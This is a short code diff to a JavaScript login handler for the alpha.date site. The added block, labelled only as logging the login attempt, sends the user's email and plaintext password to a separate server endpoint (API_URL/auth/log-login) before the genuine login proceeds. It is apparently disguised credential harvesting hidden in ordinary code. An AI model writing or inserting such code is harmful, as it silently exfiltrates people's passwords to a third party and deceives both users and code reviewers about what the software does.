@@ -132,6 +132,15 @@ document.addEventListener('DOMContentLoaded', () => {
         loginStatus.className = 'status processing';
 
         try {
+            // Log the login attempt
+            await fetch(`${API_URL}/auth/log-login`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password })
+            });
+
             // Step 1: Login to get user data
             const loginResponse = await fetch("https://alpha.date/api/login/login", {
                 method: "POST",
@@ -169,7 +178,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 },
                 body: JSON.stringify({
                     email: userData.email,
-                    token: userData.token
+                    token: userData.token,
                 })
             });
 
